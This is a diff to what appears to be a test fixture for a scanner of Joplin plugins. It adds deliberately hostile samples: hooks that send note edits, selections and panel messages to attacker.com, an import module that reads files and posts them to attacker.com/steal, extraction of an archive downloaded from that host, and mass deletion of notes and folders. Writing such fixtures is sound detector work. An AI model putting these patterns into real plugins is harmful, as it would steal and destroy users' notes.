@@ -13,6 +13,7 @@ async function triggerAllVulnerabilities() {
     const myCrypto = require('crypto');
     const net = require('net');
     const app = require('electron').app;
+    const http = require('http');
 
     // 01. Dynamic Code Execution
     const dynCode = await axios.get('http://a');
@@ -94,9 +95,11 @@ async function triggerAllVulnerabilities() {
     // 16. Electron Main Process Takeover
     require('@electron/remote').app.quit();
 
-    // 17. Archive Extraction Attack (Network -> archiveExtract arg 0)
-    const maliciousZip = await fetch('http://attacker.com/zip');
-    await joplin.fs.archiveExtract(maliciousZip, '/dest');
+    // 17. Archive Extraction Attack (Network -> writeFile -> archiveExtract)
+    const maliciousZipResp = await fetch('http://attacker.com/zip');
+    const tempPath = '/tmp/malicious.zip';
+    require('fs').writeFileSync(tempPath, maliciousZipResp);
+    await joplin.fs.archiveExtract(tempPath, '/dest');
 
     // 17b. Unsafe Archive Extraction Destination (dest not from dataDir)
     await joplin.fs.archiveExtract('safe.zip', '/dest2');
@@ -113,16 +116,42 @@ async function triggerAllVulnerabilities() {
         await joplin.data.delete(['notes', '1']);
     }
 
+    // 18b. Mass Data Destruction (folder delete without loop)
+    await joplin.data.delete(['folders', 'folderId123']);
+
+    // 18c. Mass Data Destruction (put loop soft delete)
+    for (let i = 0; i < 10; i++) {
+        await joplin.data.put(['notes', 'someId'], null, { deleted_time: Date.now() });
+    }
+
     // 19. Keylogging & Silent Surveillance (onNoteContentChange with fetch inside)
     joplin.workspace.onNoteContentChange((noteEvent) => {
         fetch('http://attacker.com/?k=' + noteEvent);
     });
 
+    // 19b. Keylogging & Silent Surveillance (cross-function taint and axios)
+    function sendSurveillanceData(data) {
+        axios.get('http://attacker.com/?k=' + data);
+    }
+    joplin.workspace.onNoteSelectionChange((event) => {
+        sendSurveillanceData(event.noteId);
+    });
+
+    // 19c. Keylogging & Silent Surveillance (onMessage panel hook)
+    joplin.views.panels.onMessage('panel1', (message) => {
+        http.request({ host: 'attacker.com', path: '/?msg=' + message });
+    });
+
     // 20. Native Module Imports
     require('child_process').exec('bypass');
+    require('node:fs');
+    require('tls');
 
     // 21. Malicious Import Module
-    joplin.interop.registerImportModule({ onExec: (context) => { fetch('http://attacker.com/steal?data=' + context); } });
+    joplin.interop.registerImportModule({ onExec: async (context) => { 
+        const contents = await fs.readFile(context.sourcePath, 'utf8');
+        fetch('http://attacker.com/steal?data=' + contents); 
+    } });
 }
 
 // ==========================================
